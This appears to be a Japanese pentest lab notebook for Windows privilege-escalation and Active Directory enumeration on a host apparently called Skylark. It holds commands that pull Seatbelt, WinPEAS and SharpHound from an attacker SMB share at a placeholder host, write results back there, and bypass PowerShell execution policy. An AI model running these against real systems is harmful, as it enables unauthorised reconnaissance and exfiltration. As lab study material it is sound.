# Local

## Auto w/ [Seatbelt](https://github.com/GhostPack/Seatbelt)

### 転送・実行

```zsh
# Attacker
mkdir share
wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/refs/heads/master/Seatbelt.exe -O share/Seatbelt.exe
impacket-smbserver -smb2support -username username -password pw share share
```
```powershell
# Target
net use \\<AttackerIP>\share /user:username pw
cp \\<AttackerIP>\share\Seatbelt.exe .
.\Seatbelt.exe -group=all | Tee-Object -FilePath \\<AttackerIP>\share\seatbelt_result.txt
```

### 実行結果抽出

```powershell

```


## Auto w/ [WinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)

### 転送・実行

```zsh
# Attacker
mkdir share
cp /usr/share/peass/winpeas/winPEASx64.exe share/
impacket-smbserver -smb2support -username username -password pw share share
```
```powershell
# Target
cd ~
net use \\<AttackerIP>\share /user:username pw
cp \\<AttackerIP>\share\winPEASx64.exe .
.\winPEASx64.exe | Tee-Object -FilePath \\<AttackerIP>\share\peas_result.txt
```

### 実行結果抽出

```powershell

```

---
---

## Manual

### ユーザー

- SeImpersonatePrivilegeがある
```
PS C:\> whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```


---

### システム情報


---

### ネットワーク

- ローカルサービス（おそらくMSSQL）が動作している
```powershell
netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
...  
  TCP    0.0.0.0:2994           0.0.0.0:0              LISTENING       2452
...  
  TCP    127.0.0.1:1434         0.0.0.0:0              LISTENING       824
  TCP    127.0.0.1:14148        0.0.0.0:0              LISTENING       2284
  TCP    192.168.141.226:139    0.0.0.0:0              LISTENING       4
  TCP    192.168.141.226:24621  192.168.45.239:56468   ESTABLISHED     2284
  TCP    192.168.141.226:63787  192.168.45.239:443     ESTABLISHED     1668
  TCP    192.168.141.226:63810  20.72.205.209:443      TIME_WAIT       0
  TCP    192.168.141.226:63822  20.106.86.13:443       SYN_SENT        376
  TCP    192.168.141.226:63823  74.178.76.128:443      SYN_SENT        2700
...

PS C:\> ls
...
	inetpub
	Skylark
	SQL2022
```


---

### インストール済みアプリケーション


---

### 実行中のプロセス


---

### PowerShellログ


---

### サービス


---

### スケジュールタスク


---

### 興味深い情報

#### Skylark

- Development...というフォルダに、`?????.exe`というファイルがある
- ファイルをローカルに転送すると、「売上を分析する.exe」というファイルが見つかるので、中身を表示する
```sh
strings 売上を分析する.exe 
```


```sh
strings -e l 売上を分析する.exe # 特になし
```

#### SQL2022



---
---

# AD

## Auto w/ BloodHound

```zsh
# Attacker(作成済みのSMB共有を使う)
cp /opt/bloodhound/SharpHound.ps1 share
```
```powershell
# Target
powershell -ep bypass
net use \\<AttackerIP>\share /user:username pw
Import-Module \\<AttackerIP>\share\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory \\<AttackerIP>\share -ZipFileName 'audit.zip'
```